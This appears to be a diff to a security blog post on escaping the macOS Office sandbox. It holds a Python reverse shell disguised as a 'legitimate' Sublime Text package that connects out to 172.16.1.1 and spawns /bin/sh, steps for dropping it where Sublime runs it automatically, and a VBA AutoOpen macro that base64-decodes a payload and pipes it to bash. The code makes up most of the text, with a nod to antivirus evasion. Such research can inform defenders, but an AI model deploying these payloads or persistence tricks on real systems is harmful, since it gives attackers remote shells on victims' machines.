@@ -40,27 +40,26 @@ Then add your benign python code to that folder.
 
 ```bash
 cat > ~/Library/Application Support/Sublime Text 3/Packages/legitimate.py << EOF
-import socket, subprocess, os;
-s=socket.socket(socket.AF_INET,so.SOCK_STREAM);
-s.connect(("172.16.1.1",8080));
+import sublime, sublime_plugin, socket, subprocess, os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("172.16.1.1",8088));
 os.dup2(s.fileno(),0);
 os.dup2(s.fileno(),1);
 os.dup2(s.fileno(),2);
-p=subprocess.call(["/bin/sh","-i"]);');
+p=subprocess.call(["/bin/sh","-i"]);
 EOF
 ```
 Now in Sublime Text, `Ctrl + Shift + P` > Create Package > legitimate > Default
 
-And your new package file will be at `~/Desktop/test.sublime-package`. 
+And your new package file will be at `~/Desktop/test.sublime-package`.
 
 This file can now be copied to `~/Library/Application Support/Sublime Text 3/Installed Packages/` or `%APPDATA%\Sublime Text 3\Installed Packages\` where Sublime will automatically pick it up and run your code.
 
 > Note: I did run into some issues with Package Control not compiling my code on macOS, but manually compiling before creating the package seemed to get things working.
-> ```bash
-> % cd ~/Library/Application Support/Sublime Text 3/Packages
-> % python -m compileall legitimate.py
-> % rm legitimate.py #YMMV
 > ```
+> % cd ~/Library/Application\ Support/Sublime\ Text\ 3/Packages/legitimate
+> % python -m compileall legitimate.py
+> % rm legitimate.py #YMMV```
 
 ## Macros
 So how do we leverage all that to seamlessly escape the Office sandbox? The following code snippet is sufficient to have Sublime execute Python of our choosing outside the sandbox. Or rather than the code snippet, copy the binary sublime-package file to the `Installed Packages` to provide some obfuscation.
@@ -105,7 +104,7 @@ for i in range(0,len(out), n):
 print('''Sub AutoOpen()
 Dim Str
 {}
-MacScript "do shell script \\""echo" & Str & "\\"" | /usr/bin/base64 -D | /bin/bash"" "
+MacScript "do shell script ""echo \\"" " & Str & "\\"" | /usr/bin/base64 -D | /bin/bash"" "
 End Sub
 ''').format("\n".join(macro))
 
@@ -115,22 +114,22 @@ Leaving you with something like the following. AV and EDR avoidance obviously up
 ```
 Sub AutoOpen()
 Dim Str
-str = "ZWNobyAiaW1wb3J0IGJhc2U2NCwgZXhlYyhiYXNlNj"
-str = str + "QuYjY0ZGVjb2RlKCdhVzF3YjNKMElHOXpDbVp2Y25O"
-str = str + "MVlteHBiV1VnUFNBbkp5Y0thVzF3YjNKMElHOXpDbT"
-str = str + "l6TG5ONWMzUmxiU2duYjNCbGJpQXRZU0F2UVhCd2JH"
-str = str + "bGpZWFJwYjI1ekwwTmhiR04xYkdGMGIzSXVZWEJ3Sn"
-str = str + "lrS0p5Y25DbmRwZEdnZ2IzQmxiaWduYkdWbmFYUnBi"
-str = str + "V0YwWldacGJHVXVkSGgwSnl3Z0ozY25LU0JoY3lCbU"
-str = str + "9nb2dJQ0FnSUNBZ0lHWXVkM0pwZEdVb1ptOXljM1Zp"
-str = str + "YkdsdFpTa0tDbTl6TG5ONWMzUmxiU2dpWTNBZ2JHVm"
-str = str + "5hWFJwYldGMFpXWnBiR1V1ZEhoMElDOVZjMlZ5Y3k4"
-str = str + "a1ZWTkZVaTlNYVdKeVlYSjVMMEZ3Y0d4cFkyRjBhVz"
-str = str + "l1SUZOMWNIQnZjblF2VTNWaWJHbHRaU0JVWlhoMElE"
-str = str + "TXZTVzV6ZEdGc2JHVmtJRkJoWTJ0aFoyVnpMMzVjSk"
-str = str + "d4bFoybDBhVzFoZEdWZmNHeDFaMmx1TG5OMVlteHBi"
-str = str + "V1V0Y0dGamEyRm5aU0lwQ2c9PScpKTsiIHwgL3Vzci"
-str = str + "9iaW4vcHl0aG9uICY="
-MacScript "do shell script \""echo" & Str & "\""|base64 -D|bash"" "
+str = "ZWNobyAiaW1wb3J0IGJhc2U2NCBhcyBiLCBzeXM7IG"
+str = str + "V4ZWMoYi5iNjRkZWNvZGUoJ2ltcG9ydCBvczsgb3Mu"
+str = str + "c3lzdGVtKCJvcGVuIGh0dHBzOi8vd3d3LnlvdXR1Ym"
+str = str + "UuY29tL3dhdGNoP3Y9b0hnNVNKWVJIQTA7IG9wZW4g"
+str = str + "aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj"
+str = str + "1vSGc1U0pZUkhBMDtvcGVuIGh0dHBzOi8vd3d3Lnlv"
+str = str + "dXR1YmUuY29tL3dhdGNoP3Y9b0hnNVNKWVJIQTA7Ii"
+str = str + "knKSk7IiB8IHB5dGhvbiAgJg=="
+MacScript "do shell script "" echo \"" " & Str & " \"" | /usr/bin/base64 -D | /bin/bash"" "
 End Sub
 ```
+
+Assuming that macro was run, the attacker is receives a shell but one restricted to the Office sandbox. In the following screenshot you see access to `/tmp/` is not permitted, and any attempt to access user directories is met with the same message.
+
+{{< figure src="/img/sublime-sandbox.png">}}
+
+But once we copy our malicious Sublime package to the Installed Packages directory, we immediately see another reverse shell come in, this time without the sandbox restrictions.
+
+{{< figure src="/img/sublime-out-of-the-sandbox.png">}}
